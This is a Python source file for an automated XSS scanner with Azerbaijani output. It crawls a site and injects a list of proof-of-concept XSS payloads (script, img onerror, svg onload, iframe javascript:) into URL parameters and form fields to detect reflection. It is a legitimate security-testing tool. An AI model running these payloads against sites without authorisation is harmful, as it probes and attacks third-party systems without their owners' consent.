#!/usr/bin/env python3
"""
xssscannerpro — Automated XSS Vulnerability Scanner
Author: Elshan Mammadov (ENI for LO)
License: MIT
"""

import sys
import os
import time
import urllib.parse
from urllib.parse import urlparse, urljoin
import requests
from bs4 import BeautifulSoup

# ─── CONFIG ───────────────────────────────────────────────────────────
COLORS = {
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m',
    'white': '\033[97m',
    'bold': '\033[1m',
    'end': '\033[0m',
}

VERSION = "1.0.0"

BANNER = f"""
{COLORS['cyan']}{COLORS['bold']}
============================================================
                 XSSSCANNERPRO v{VERSION}
       Advanced Automated XSS Vulnerability Scanner
============================================================
{COLORS['white']}                    Created by Elshan Mammadov{COLORS['end']}
"""

PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<iframe src=javascript:alert(1)>'
]

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'xssscannerpro/1.0 (security research)'
        })
        self.vulnerabilities = []
        self.visited = set()

    def log(self, msg, level='info'):
        icons = {
            'info': f"{COLORS['blue']}[i]{COLORS['end']}", 
            'vuln': f"{COLORS['red']}[!]{COLORS['end']}", 
            'ok': f"{COLORS['green']}[+]{COLORS['end']}", 
            'warn': f"{COLORS['yellow']}[?]{COLORS['end']}"
        }
        print(f"{icons.get(level, '[i]')} {msg}")

    def crawl(self, url, depth=0, max_depth=2):
        if depth > max_depth or url in self.visited:
            return
        self.visited.add(url)
        try:
            r = self.session.get(url, timeout=7)
            soup = BeautifulSoup(r.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full = urljoin(url, link['href'])
                if self.domain in urlparse(full).netloc:
                    self.crawl(full, depth + 1, max_depth)
        except:
            pass

    def extract_params(self, url):
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for pair in parsed.query.split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    params[k] = v
        return params

    def find_forms(self, url):
        forms = []
        try:
            r = self.session.get(url, timeout=7)
            soup = BeautifulSoup(r.text, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                inputs = {}
                for inp in form.find_all(['input', 'textarea']):
                    name = inp.get('name', '')
                    if name:
                        inputs[name] = inp.get('value', '')
                forms.append({
                    'action': urljoin(url, action),
                    'method': method,
                    'inputs': inputs
                })
        except:
            pass
        return forms

    def test_url_params(self, url):
        params = self.extract_params(url)
        if not params:
            return
        self.log(f"URL parametrləri yoxlanılır: {url}", 'info')
        for param_name in params:
            for payload in PAYLOADS:
                test_url = url.split('?')[0]
                qs = '&'.join(f"{k}={payload if k == param_name else v}" for k, v in params.items())
                test_url = f"{test_url}?{qs}"
                if self.check_reflection(test_url, payload):
                    self.vulnerabilities.append({
                        'type': 'Reflected XSS (URL Param)',
                        'url': test_url,
                        'param': param_name,
                        'payload': payload
                    })
                    self.log(f"XSS TAPILDI! Parametr: {param_name}", 'vuln')
                    return

    def test_forms(self, url):
        forms = self.find_forms(url)
        if not forms:
            return
        self.log(f"{len(forms)} form tapıldı, sınaqdan keçirilir...", 'info')
        for form in forms:
            for param_name in form['inputs']:
                for payload in PAYLOADS:
                    data = dict(form['inputs'])
                    data[param_name] = payload
                    try:
                        if form['method'] == 'post':
                            r = self.session.post(form['action'], data=data, timeout=7)
                        else:
                            r = self.session.get(form['action'], params=data, timeout=7)
                        if self.check_reflection(r.text, payload):
                            self.vulnerabilities.append({
                                'type': 'Reflected XSS (Form)',
                                'url': form['action'],
                                'param': param_name,
                                'payload': payload
                            })
                            self.log(f"XSS TAPILDI! Form: {param_name}", 'vuln')
                            return
                    except:
                        continue

    def check_reflection(self, target_or_content, payload):
        try:
            if target_or_content.startswith("http"):
                r = self.session.get(target_or_content, timeout=7)
                content = r.text
            else:
                content = target_or_content
            return payload in content
        except:
            return False

    def scan(self):
        self.log(f"Hədəf tarama başlayır: {self.target_url}", 'info')
        self.log("Səhifələr (Crawler) gəzilir...", 'info')
        self.crawl(self.target_url)
        self.log(f"Ümumi {len(self.visited)} səhifə tapıldı.", 'ok')

        urls = list(self.visited)
        if self.target_url not in urls:
            urls.insert(0, self.target_url)

        for url in urls:
            self.test_url_params(url)
            self.test_forms(url)
            time.sleep(0.2)

        self.report()

    def report(self):
        print("\n" + "="*60)
        if self.vulnerabilities:
            print(f"{COLORS['red']}{COLORS['bold']}NƏTICƏ: {len(self.vulnerabilities)} XSS zəifliyi aşkar edildi!{COLORS['end']}")
            print("="*60)
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n[{i}] Növü: {vuln['type']}")
                print(f"    URL: {vuln['url']}")
                print(f"    Parametr: {vuln['param']}")
                print(f"    Payload: {vuln['payload']}")
        else:
            print(f"{COLORS['green']}NƏTİCƏ: Heç bir XSS boşluğu tapılmadı. Sayt təhlükəsiz görünür.{COLORS['end']}")
        print("="*60)

if __name__ == "__main__":
    print(BANNER)
    print("\n")

    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input(f"{COLORS['cyan']}[*] Zəhmət olmasa hədəf URL-i yapışdırın (məs: http://testphp.vulnweb.com/): {COLORS['end']}")
    
    if target.strip():
        scanner = XSSScanner(target)
        scanner.scan()
    else:
        print(f"{COLORS['red']}[!] Xəta: Boş URL daxil etdiniz!{COLORS['end']}")
